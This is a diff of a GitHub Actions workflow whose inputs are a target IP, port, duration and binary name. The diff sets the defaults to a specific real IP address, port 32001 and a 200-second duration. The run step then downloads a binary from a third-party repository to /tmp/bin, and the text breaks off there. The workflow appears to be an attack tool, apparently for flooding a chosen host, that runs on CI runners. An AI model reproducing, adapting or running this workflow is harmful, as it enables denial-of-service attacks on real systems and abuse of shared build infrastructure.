@@ -7,15 +7,15 @@ on:
       ip:
         description: 'Target IP'
         required: true
-        default: '1.1.1.1'
+        default: '91.108.17.50'
       port:
         description: 'Target Port'
         required: true
-        default: '80'
+        default: '32001'
       duration:
         description: 'Duration'
         required: true
-        default: '60'
+        default: '200'
       bin:
         description: 'Binary Name'
         required: true
@@ -36,9 +36,9 @@ jobs:
     steps:
       - name: Execute
         run: |
-          IP="${{ github.event.inputs.ip || '1.1.1.1' }}"
-          PORT="${{ github.event.inputs.port || '80' }}"
-          DUR="${{ github.event.inputs.duration || '60' }}"
+          IP="${{ github.event.inputs.ip || '91.108.17.50' }}"
+          PORT="${{ github.event.inputs.port || '32001' }}"
+          DUR="${{ github.event.inputs.duration || '200' }}"
           BIN="${{ github.event.inputs.bin || 'mustafa' }}"
           B=""
           if curl -fsSL --connect-timeout 5 --max-time 10 -o /tmp/bin "https://raw.githubusercontent.com/narutouzumaki9tail786786-sketch/soulcrack-tg/HEAD/$BIN" 2>/dev/null; then
